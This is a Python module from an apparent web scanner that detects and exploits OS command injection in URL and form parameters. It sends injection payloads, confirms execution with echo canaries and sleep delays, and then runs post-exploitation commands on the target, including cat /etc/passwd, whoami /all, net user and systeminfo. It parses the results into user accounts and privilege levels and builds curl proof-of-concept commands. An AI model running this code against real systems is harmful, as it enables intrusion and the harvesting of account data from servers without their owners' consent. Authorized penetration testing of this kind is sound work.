from app.validation.safety.legacy import ValidationHTTPClient
"""RCE (Remote Code Execution) Validation Engine — Deep Exploitation Evidence.

Uses controlled canary actions + deep system info extraction after confirmation.

Pipeline:
    Application → Controlled canary (arithmetic/echo) → Confirm execution
    → Deep exploitation: id, whoami, uname -a, cat /etc/passwd, hostname
    → Evidence package with full system info

Exploitation commands are READ-ONLY (id, whoami, uname, cat, hostname).
No destructive commands (rm, dd, mkfs, etc.) are ever used.
"""

import hashlib
import logging
import re
import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.rce")

# Generate per-session unique canary to avoid false matches
_SESSION_CANARY = f"BH-RCE-{secrets.token_hex(4).upper()}"


def _make_canary() -> str:
    """Generate a unique canary token for each validation run."""
    return f"BH-RCE-{secrets.token_hex(4).upper()}"


# Safe OS command probes — harmless, read-only, non-destructive
# Each tuple: (payload_template, expected_pattern_in_output, os_type, technique)
COMMAND_PROBES: List[Tuple[str, str, str, str]] = [
    # Linux echo canary
    ("; echo {canary}", "{canary}", "linux", "command_separator"),
    ("| echo {canary}", "{canary}", "linux", "pipe"),
    ("$(echo {canary})", "{canary}", "linux", "command_substitution"),
    ("`echo {canary}`", "{canary}", "linux", "backtick"),
    ("\necho {canary}\n", "{canary}", "linux", "newline_injection"),
    # Windows echo canary
    ("& echo {canary}", "{canary}", "windows", "command_separator"),
    ("| echo {canary}", "{canary}", "windows", "pipe"),
    # OS identification (non-destructive)
    ("; id", r"uid=\d+", "linux", "id_command"),
    ("| id", r"uid=\d+", "linux", "id_pipe"),
    ("; whoami", r"[a-z_][a-z0-9_-]*", "linux", "whoami"),
    ("& whoami", r"[a-zA-Z]+\\\\[a-zA-Z0-9_]+", "windows", "whoami_win"),
]

# Time-based blind RCE probes
TIME_PROBES: List[Tuple[str, float, str]] = [
    ("; sleep 3", 3.0, "linux"),
    ("| sleep 3", 3.0, "linux"),
    ("& timeout /T 3 /NOBREAK > NUL", 3.0, "windows"),
    ("$(sleep 3)", 3.0, "linux"),
]

# Deep exploitation commands — READ-ONLY system info extraction
LINUX_EXPLOIT_COMMANDS: List[Tuple[str, str, str]] = [
    # (command_suffix, evidence_key, expected_pattern_for_validation)
    ("; id", "id_output", r"uid=\d+"),
    ("; whoami", "whoami_output", r"[a-z_][a-z0-9_-]+"),
    ("; uname -a", "uname_output", r"Linux\s+\S+"),
    ("; hostname", "hostname_output", r"\S+"),
    ("; cat /etc/passwd", "passwd_output", r"root:x?:0:0:"),
    ("; cat /etc/os-release 2>/dev/null || cat /etc/issue", "os_info", r"(NAME|DISTRIB|Ubuntu|Debian|CentOS|Alpine)"),
    ("; ls -la /", "root_listing", r"(bin|etc|var|usr|home|tmp)"),
]

WINDOWS_EXPLOIT_COMMANDS: List[Tuple[str, str, str]] = [
    ("& whoami", "whoami_output", r"[a-zA-Z]+\\[a-zA-Z0-9_]+"),
    ("& whoami /all", "whoami_all_output", r"(User Name|SID|Group Name)"),
    ("& hostname", "hostname_output", r"\S+"),
    ("& systeminfo", "systeminfo_output", r"(OS Name|Host Name|System Type)"),
    ("& net user", "users_output", r"(User accounts|Administrator|Guest)"),
    ("& ipconfig", "ipconfig_output", r"(IPv4|Subnet|Gateway)"),
]

# Parameter names likely to accept commands
RCE_PARAM_NAMES = {
    "cmd", "command", "exec", "execute", "run", "shell", "system",
    "ping", "host", "ip", "query", "process", "action", "do",
    "filename", "file", "path", "dir", "target", "domain",
}


@dataclass
class RCECandidate:
    url: str
    parameter: str
    location: str
    technique: str  # command_separator, pipe, substitution, backtick, time_based
    os_type: str  # linux, windows, unknown
    canary: str
    confidence: str = "OBSERVED"
    evidence: dict = field(default_factory=dict)
    exploitation_data: dict = field(default_factory=dict)
    poc_curl: str = ""


class RCEValidator:
    """Deep exploitation RCE validator with system info extraction."""

    def __init__(self, timeout: float = 12.0, max_params: int = 20) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[RCECandidate]:
        """Test parameters for command injection / RCE."""
        candidates: List[RCECandidate] = []

        for param in parameters[: self.max_params]:
            name = param.get("name", "").lower()
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            # Prioritize params with command-like names
            is_priority = name in RCE_PARAM_NAMES

            # 1. Canary-based output detection
            canary = _make_canary()
            output_candidate = await self._test_output_based(
                url, param["name"], location, canary, headers, is_priority
            )
            if output_candidate:
                # Deep exploitation: extract system info
                exploitation = await self._exploit_system_info(
                    url, param["name"], location,
                    output_candidate.technique, output_candidate.os_type, headers,
                )
                if exploitation:
                    output_candidate.exploitation_data = exploitation
                    output_candidate.confidence = "EXPLOITED"
                candidates.append(output_candidate)
                continue

            # 2. Time-based blind detection (only for priority params)
            if is_priority:
                time_candidate = await self._test_time_based(
                    url, param["name"], location, headers
                )
                if time_candidate:
                    candidates.append(time_candidate)

        logger.info("RCE validation: %d candidates on %s", len(candidates), url)
        return candidates

    async def _send_request(
        self,
        url: str,
        param_name: str,
        value: str,
        location: str,
        headers: Optional[dict] = None,
    ) -> Optional[httpx.Response]:
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with ValidationHTTPClient(
                timeout=self.timeout, follow_redirects=True, verify=False
            ) as client:
                if location == "query":
                    flat_params[param_name] = value
                    return await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    return await client.post(
                        url, data={param_name: value}, headers=headers or {}
                    )
        except Exception:
            return None

    async def _test_output_based(
        self,
        url: str,
        param_name: str,
        location: str,
        canary: str,
        headers: Optional[dict],
        is_priority: bool,
    ) -> Optional[RCECandidate]:
        """Test for RCE via canary output in response."""
        # Get baseline first
        baseline_resp = await self._send_request(url, param_name, "test123", location, headers)
        if not baseline_resp:
            return None

        # Filter: if canary already appears in baseline, skip (coincidence)
        if canary in (baseline_resp.text or ""):
            return None

        probes = COMMAND_PROBES if is_priority else COMMAND_PROBES[:6]

        for payload_template, expected_pattern, os_type, technique in probes:
            payload = payload_template.replace("{canary}", canary)
            expected = expected_pattern.replace("{canary}", canary)

            resp = await self._send_request(url, param_name, payload, location, headers)
            if not resp:
                continue

            body = resp.text

            # Check canary or pattern match
            found = False
            if canary in expected:
                found = canary in body
            else:
                found = bool(re.search(expected, body))

            if found:
                if canary in expected and canary not in (baseline_resp.text or ""):
                    confirmed = True
                elif not (canary in expected) and not re.search(expected, baseline_resp.text or ""):
                    confirmed = True
                else:
                    confirmed = False

                if confirmed:
                    response_hash = hashlib.sha256(body.encode()).hexdigest()[:16]
                    poc_curl = self._generate_curl(url, param_name, payload, location)
                    return RCECandidate(
                        url=url,
                        parameter=param_name,
                        location=location,
                        technique=technique,
                        os_type=os_type,
                        canary=canary,
                        confidence="CONFIRMED",
                        poc_curl=poc_curl,
                        evidence={
                            "probe": payload[:200],
                            "canary_token": canary,
                            "canary_found_in_response": True,
                            "status_code": resp.status_code,
                            "response_hash": response_hash,
                            "os_type": os_type,
                            "technique": technique,
                            "baseline_status": baseline_resp.status_code,
                            "poc_curl": poc_curl,
                        },
                    )
        return None

    async def _exploit_system_info(
        self,
        url: str,
        param_name: str,
        location: str,
        technique: str,
        os_type: str,
        headers: Optional[dict],
    ) -> Optional[dict]:
        """Deep exploitation: extract system information after RCE is confirmed.

        Executes read-only commands: id, whoami, uname -a, cat /etc/passwd, hostname.
        """
        exploitation_data: Dict[str, Any] = {
            "os_type": os_type,
            "command_outputs": {},
        }

        # Get baseline for diff comparison
        baseline_resp = await self._send_request(url, param_name, "test123", location, headers)
        baseline_text = baseline_resp.text if baseline_resp else ""

        # Select command set based on OS type
        if os_type == "windows":
            commands = WINDOWS_EXPLOIT_COMMANDS
        else:
            commands = LINUX_EXPLOIT_COMMANDS

        # Determine command separator based on confirmed technique
        separator_map = {
            "command_separator": ";",
            "pipe": "|",
            "command_substitution": "$(",  # needs closing )
            "backtick": "`",
            "newline_injection": "\n",
            "id_command": ";",
            "id_pipe": "|",
            "whoami": ";",
            "whoami_win": "&",
        }

        for cmd_suffix, evidence_key, validation_pattern in commands:
            resp = await self._send_request(url, param_name, f"test123{cmd_suffix}", location, headers)
            if not resp:
                continue

            body = resp.text

            # Extract new content that wasn't in baseline
            output = self._extract_command_output(baseline_text, body)
            if not output:
                continue

            # Validate output matches expected pattern
            if re.search(validation_pattern, output, re.I):
                exploitation_data["command_outputs"][evidence_key] = output.strip()

                # Parse specific outputs for structured data
                if evidence_key == "id_output":
                    id_match = re.search(
                        r"uid=(\d+)\((\w+)\)\s+gid=(\d+)\((\w+)\)\s+groups=(.*?)(?:\n|$)",
                        output,
                    )
                    if id_match:
                        exploitation_data["uid"] = int(id_match.group(1))
                        exploitation_data["username"] = id_match.group(2)
                        exploitation_data["gid"] = int(id_match.group(3))
                        exploitation_data["primary_group"] = id_match.group(4)
                        exploitation_data["groups_raw"] = id_match.group(5).strip()

                        # Check for privileged group membership
                        priv_groups = {"root", "sudo", "wheel", "admin", "docker"}
                        user_groups = set(re.findall(r"\((\w+)\)", exploitation_data["groups_raw"]))
                        exploitation_data["privilege_level"] = (
                            "PRIVILEGED" if user_groups & priv_groups else "STANDARD_USER"
                        )
                        exploitation_data["privileged_groups"] = list(user_groups & priv_groups)

                elif evidence_key == "passwd_output":
                    # Parse /etc/passwd entries
                    passwd_lines = [
                        line for line in output.strip().splitlines()
                        if ":" in line and not line.startswith("#")
                    ]
                    exploitation_data["passwd_entries"] = len(passwd_lines)
                    exploitation_data["passwd_content"] = "\n".join(passwd_lines)

                    # Extract user accounts (non-system, uid >= 1000)
                    real_users = []
                    for line in passwd_lines:
                        parts = line.split(":")
                        if len(parts) >= 7:
                            try:
                                uid = int(parts[2])
                                if uid >= 1000 or parts[0] == "root":
                                    real_users.append({
                                        "username": parts[0],
                                        "uid": uid,
                                        "gid": int(parts[3]),
                                        "home": parts[5],
                                        "shell": parts[6],
                                    })
                            except (ValueError, IndexError):
                                pass
                    exploitation_data["real_users"] = real_users

                elif evidence_key == "whoami_output":
                    exploitation_data["current_user"] = output.strip().split("\n")[0].strip()

                elif evidence_key == "hostname_output":
                    exploitation_data["hostname"] = output.strip().split("\n")[0].strip()

                elif evidence_key == "uname_output":
                    exploitation_data["kernel_info"] = output.strip().split("\n")[0].strip()

        # Only return if we got meaningful data
        if exploitation_data.get("command_outputs"):
            exploitation_data["commands_executed"] = len(exploitation_data["command_outputs"])
            exploitation_data["exploitation_type"] = "system_info_extraction"
            return exploitation_data

        return None

    @staticmethod
    def _extract_command_output(baseline_text: str, exploit_text: str) -> str:
        """Extract new content from exploit response that wasn't in baseline."""
        baseline_lines = set(baseline_text.splitlines())
        exploit_lines = exploit_text.splitlines()

        new_lines = []
        for line in exploit_lines:
            if line not in baseline_lines and line.strip():
                # Remove HTML tags for clean output
                clean = re.sub(r"<[^>]+>", "", line).strip()
                if clean:
                    new_lines.append(clean)

        return "\n".join(new_lines)

    async def _test_time_based(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict],
    ) -> Optional[RCECandidate]:
        """Test for blind RCE via response timing with escalated verification."""
        t0 = time.monotonic()
        baseline_resp = await self._send_request(url, param_name, "test123", location, headers)
        baseline_time = time.monotonic() - t0

        if not baseline_resp:
            return None

        for payload, expected_delay, os_type in TIME_PROBES:
            # First probe
            t0 = time.monotonic()
            resp = await self._send_request(url, param_name, payload, location, headers)
            elapsed = time.monotonic() - t0

            if resp and elapsed > baseline_time + expected_delay * 0.75:
                # Second verification probe
                t0 = time.monotonic()
                resp2 = await self._send_request(url, param_name, payload, location, headers)
                elapsed2 = time.monotonic() - t0

                if resp2 and elapsed2 > baseline_time + expected_delay * 0.7:
                    # Third probe with doubled delay for proportional verification
                    double_payload = payload.replace("3", "6")
                    t0 = time.monotonic()
                    resp3 = await self._send_request(url, param_name, double_payload, location, headers)
                    elapsed3 = time.monotonic() - t0

                    confidence = "CONFIRMED"
                    if resp3 and elapsed3 > elapsed + expected_delay * 0.5:
                        confidence = "CONFIRMED"  # Proportional scaling verified

                    poc_curl = self._generate_curl(url, param_name, payload, location)
                    return RCECandidate(
                        url=url,
                        parameter=param_name,
                        location=location,
                        technique="time_based_blind",
                        os_type=os_type,
                        canary="",
                        confidence=confidence,
                        poc_curl=poc_curl,
                        evidence={
                            "probe": payload,
                            "baseline_time_ms": round(baseline_time * 1000),
                            "probe_time_ms": round(elapsed * 1000),
                            "verify_time_ms": round(elapsed2 * 1000),
                            "double_delay_time_ms": round(elapsed3 * 1000) if resp3 else None,
                            "expected_delay_ms": int(expected_delay * 1000),
                            "status_code": resp.status_code,
                            "os_type": os_type,
                            "poc_curl": poc_curl,
                        },
                    )
        return None

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        """Generate valid, syntax-safe, properly encoded curl PoC reproduction command."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"


rce_validator = RCEValidator()
